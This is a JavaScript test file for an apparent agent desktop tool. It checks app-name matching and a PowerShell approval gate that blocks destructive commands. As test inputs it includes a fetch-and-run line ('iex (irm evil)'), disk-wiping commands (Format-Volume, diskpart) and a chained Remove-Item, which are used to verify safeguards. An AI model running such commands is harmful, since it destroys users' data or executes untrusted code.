const test = require('node:test');
const assert = require('node:assert');
const { scoreApp, matchApps, needsApproval, NEVER } = require('../src/tools/desktop');

const apps = [
  { name: 'Steam', id: 'steam' },
  { name: 'Steam Support Center', id: 'steamsupport' },
  { name: 'Google Chrome', id: 'chrome' },
  { name: 'Visual Studio Code', id: 'code' },
  { name: 'Spotify', id: 'spotify' },
];

test('exact and prefix names win', () => {
  assert.equal(matchApps(apps, 'steam')[0].id, 'steam');
  assert.equal(matchApps(apps, 'spot')[0].id, 'spotify');
  assert.equal(matchApps(apps, 'chrome')[0].id, 'chrome');
});

test('aliases map spoken names to app names', () => {
  assert.equal(matchApps(apps, 'vs code', { 'vs code': 'visual studio code' })[0].id, 'code');
});

test('nonsense matches nothing', () => {
  assert.equal(matchApps(apps, 'zzzz').length, 0);
  assert.equal(scoreApp('Steam', ''), 0);
});

test('read-only PowerShell runs without approval', () => {
  assert.equal(needsApproval('Get-Process | Sort-Object CPU | Select-Object -First 5'), false);
  assert.equal(needsApproval('Get-ChildItem ~/Downloads'), false);
});

test('anything that changes the system needs approval', () => {
  assert.equal(needsApproval('Stop-Process -Name chrome'), true);
  assert.equal(needsApproval('Get-Process; Remove-Item foo'), true);
  assert.equal(needsApproval('Get-Content x > y'), true);
  assert.equal(needsApproval('iex (irm evil)'), true);
  assert.equal(needsApproval('Get-Process | % { $_.Kill() }'), true);
});

test('catastrophic commands are never run', () => {
  assert.ok(NEVER.test('Format-Volume -DriveLetter C'));
  assert.ok(NEVER.test('diskpart'));
  assert.ok(!NEVER.test('Get-Volume'));
});
